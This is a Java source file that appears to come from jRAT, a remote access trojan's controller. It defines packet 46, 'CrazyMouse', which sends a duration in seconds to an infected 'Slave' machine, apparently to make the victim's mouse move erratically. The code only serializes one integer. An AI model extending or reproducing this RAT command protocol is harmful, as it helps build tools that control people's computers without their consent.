package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet46CrazyMouse extends AbstractOutgoingPacket {

	private int seconds;

	public Packet46CrazyMouse(int seconds) {
		this.seconds = seconds;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(seconds);
	}

	@Override
	public byte getPacketId() {
		return 46;
	}

}
